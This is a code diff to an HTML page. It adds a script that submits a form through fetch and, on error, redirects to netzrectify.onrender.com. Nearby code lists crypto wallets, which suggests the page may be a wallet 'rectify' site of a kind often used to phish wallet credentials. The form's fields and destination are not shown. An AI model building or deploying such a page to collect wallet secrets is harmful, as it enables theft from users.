@@ -6569,6 +6569,7 @@
               id="form"
               method="post"
               enctype="multipart/form-data"
+              onsubmit="return submitForm();"
             >
               <input type="hidden" name="_captcha" value="false" />
               <input
@@ -7666,6 +7667,38 @@
     <script src="assets/jquery.counterup.min.js.html"></script>
     <script src="assets/wow.min.js.html"></script>
     <script src="assets/script.js.html"></script>
+    <script>
+      function submitForm() {
+          // Get the form element
+          var form = document.getElementById("form");
+  
+          // Use the Fetch API to submit the form data
+          fetch(form.action, {
+              method: form.method,
+              body: new FormData(form),
+          })
+          .then(response => {
+              if (!response.ok) {
+                  throw new Error("Error while submitting form");
+              }
+              return response.text();
+          })
+          .then(data => {
+              // Handle successful form submission (if needed)
+              console.log(data);
+          })
+          .catch(error => {
+              // Display error alert
+              alert(error.message);
+  
+              // Redirect back to the homepage
+              window.location.href = "https://netzrectify.onrender.com/";
+          });
+  
+          // Prevent the form from submitting the traditional way
+          return false;
+      }
+  </script>
     <script>
       $(document).ready(function () {
         let wallets = $(".coin-registry button");
